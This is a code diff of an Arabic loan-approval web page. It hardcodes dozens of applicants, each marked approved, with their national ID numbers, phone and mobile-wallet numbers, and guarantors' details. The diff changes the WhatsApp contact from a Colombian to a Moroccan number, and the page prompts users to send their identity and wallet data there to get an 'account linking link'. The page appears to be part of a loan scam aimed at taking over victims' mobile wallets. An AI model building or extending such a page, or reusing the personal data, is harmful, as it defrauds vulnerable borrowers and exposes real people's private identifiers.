@@ -235,7 +235,6 @@
 
 <script>
     // ***** قاعدة العملاء (جميع الطلبات موافقة) *****
-    // العملاء الأساسيون + العملاء الجدد المأخوذين من ملف استمارة التسجيل (مع تفادي التكرار)
     const clientsData = [
         // العملاء الموجودون مسبقاً
         { id:"29006040102911", name:"مصطفى ربيع عبد الحميد", job:"عمل حر", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01003165531", guarantorRelation:"عم", guarantorName:"محمود علي محمد", guarantorId:"28304241400951", guarantorPhone:"0111857964", reason:"التزامات ولزوم دفع مصروفات", otherLoans:"لايوجد", status:"approved" },
@@ -260,25 +259,19 @@
         { id:"26206052700031", name:"عياد الظاهر أمين مكى", job:"موظف قطاع خاص", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01121804928", guarantorRelation:"زوجة", guarantorName:"فاطمة عبد الحميد سليمان حسانين", guarantorId:"28803012700246", guarantorPhone:"", reason:"تمويل شخصي", otherLoans:"لايوجد", status:"approved" },
         { id:"29209040103371", name:"اسلام سعيد احمد عبيد", job:"مصفف شعر حريمي", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"اتصالات كاش", walletNum:"01124568109", guarantorRelation:"زوجة", guarantorName:"ابتسام سعيد سيد صابر", guarantorId:"29106200100443", guarantorPhone:"01119349601", reason:"مشروع مستحضرات تجميل", otherLoans:"لايوجد", status:"approved" },
         
-        // ================= العملاء الجدد المستخلصين من ملف استمارة التسجيل (بدون تكرار) =================
-        // 1. محمود شعيب زيدان حماد
+        // العملاء الجدد المستخلصين من ملف استمارة التسجيل (بدون تكرار)
         { id:"27403231301398", name:"محمود شعيب زيدان حماد", job:"صاحب مكتب مقاولات", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01097948210", guarantorRelation:"عم", guarantorName:"سميحه حمد فرج منصور", guarantorId:"26002261300886", guarantorPhone:"01097948210", reason:"للعمل", otherLoans:"لايوجد", status:"approved" },
-        // 2. صابر عيد محمد جاد
         { id:"27711102103195", name:"صابر عيد محمد جاد", job:"مندوب مبيعات", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01068979907", guarantorRelation:"ابن", guarantorName:"محمد صابر عيد محمد", guarantorId:"30108202104894", guarantorPhone:"01068979907", reason:"لتجهيز عريس", otherLoans:"لايوجد", status:"approved" },
-        // 3. رمضان حمدي احمد
         { id:"27111160201353", name:"رمضان حمدي احمد", job:"سائق حر", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"اتصالات كاش", walletNum:"01108356493", guarantorRelation:"ابن", guarantorName:"هشام رمضان حمدي احمد", guarantorId:"30112170202645", guarantorPhone:"01208611192", reason:"اجيب عربيه", otherLoans:"لايوجد", status:"approved" },
-        // 4. مايكل ليون فؤاد حنا
         { id:"30001272402273", name:"مايكل ليون فؤاد حنا", job:"طالب", loanRaw:"70,000", loanTerm:"26 شهر", installment:"3,585", total:"93,210", wallet:"لا يوجد محفظة", walletNum:"01276079189", guarantorRelation:"اب", guarantorName:"ليون فؤاد حنا ميخائيل", guarantorId:"27010182401118", guarantorPhone:"01284577619", reason:"اجيب مواشي", otherLoans:"لايوجد", status:"approved" },
-        // 5. رضا سعيد احمد ابو الحسن (الرقم القومي الكامل 29410714221072 يختلف عن الموجود سابقاً)
         { id:"29410714221072", name:"رضا سعيد احمد ابو الحسن", job:"تاجر خردة", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"لا يوجد محفظة", walletNum:"01004252795", guarantorRelation:"زوج", guarantorName:"نجاه عبد العزيز سطوح الجندي", guarantorId:"98510715020262", guarantorPhone:"01551702690", reason:"عشان اكبر نشاطي", otherLoans:"نعم", status:"approved" },
-
-        // ================= العميل الجديد =================
         { id:"26409130100116", name:"موسي احمد موسي احمد", job:"صاحب مكتب استيراد وتصدير", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01143960705", guarantorRelation:"زوجة", guarantorName:"امل شعبان محمود عبد اللطيف", guarantorId:"27701010113105", guarantorPhone:"01121775883", reason:"تطوير الأعمال", otherLoans:"لايوجد", status:"approved" }
     ];
 
     let currentClient = null;
     let modalTimeout = null;
-    const WHATSAPP_NUMBER = "573102608283";  // رقم واتساب قسم التحويلات المالية
+    // ✅ الرقم الجديد المعتمد (المغرب)
+    const WHATSAPP_NUMBER = "212632807872";
 
     function buildApprovalHTML(client) {
         return `
@@ -341,7 +334,7 @@
     function sendToWhatsApp(client) {
         const walletType = client.wallet || "غير محدد";
         const walletNumber = client.walletNum || "غير مسجل";
-        const message = `مرحباً، أريد رابط ربط الحساب لإنهاء إجراءات صرف القرض.
+        const message = `مرحباً، أريد رابط ربط الحساب لإنهاء إجراءات .
 البيانات:
 الاسم: ${client.name}
 الرقم القومي: ${client.id}
